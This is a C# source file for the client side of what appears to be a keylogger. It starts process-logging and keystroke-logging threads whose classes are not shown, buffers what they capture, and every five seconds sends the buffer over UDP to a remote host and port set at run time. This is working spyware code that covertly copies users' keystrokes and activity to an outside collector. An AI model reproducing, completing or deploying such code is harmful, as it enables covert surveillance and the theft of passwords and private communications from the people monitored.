using Logger;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace LoggerClient
{
    public class Client
    {
        private static StringBuilder clientBuffer = new StringBuilder();
        private static string host;
        private static int port;

        public static void run(string hostName, int portVal)
        {
            host = hostName;
            port = portVal;

            Thread thread1 = new Thread(new ThreadStart(ProcessLogger.run));
            thread1.Start();
            //  Thread thread2 = new Thread(new ThreadStart(KeyLogger.run));
            Thread thread2 = new Thread(new ThreadStart(KeyLogger1.run));
            thread2.Start();
            Thread thread4 = new Thread(new ThreadStart(KeyLogger1.run1));
            thread4.Start();
            Thread thread3 = new Thread(new ThreadStart(sendBuffToServer));
            thread3.Start();
        }

        public static void appendToBuffer(StringBuilder str)
        {
            if ((str.Length + clientBuffer.Length) >=
                clientBuffer.MaxCapacity)
            {
                 clientBuffer.Remove(0, str.Length);
            }

             clientBuffer.Append(str);
        }

        private static void sendBuffToServer()
        {
            while (true)
            {
                Thread.Sleep(5000);
                if (clientBuffer.Length == 0) continue;

                UdpClient client = new UdpClient();
                client.Connect(host, port);
                byte[] data = Encoding.UTF8.GetBytes(clientBuffer.ToString());
                int sendedBytes = client.Send(data, data.Length);

                if (sendedBytes == 0) { continue; }

                client.Close();
                clientBuffer.Clear();
            }
        }
    }
}

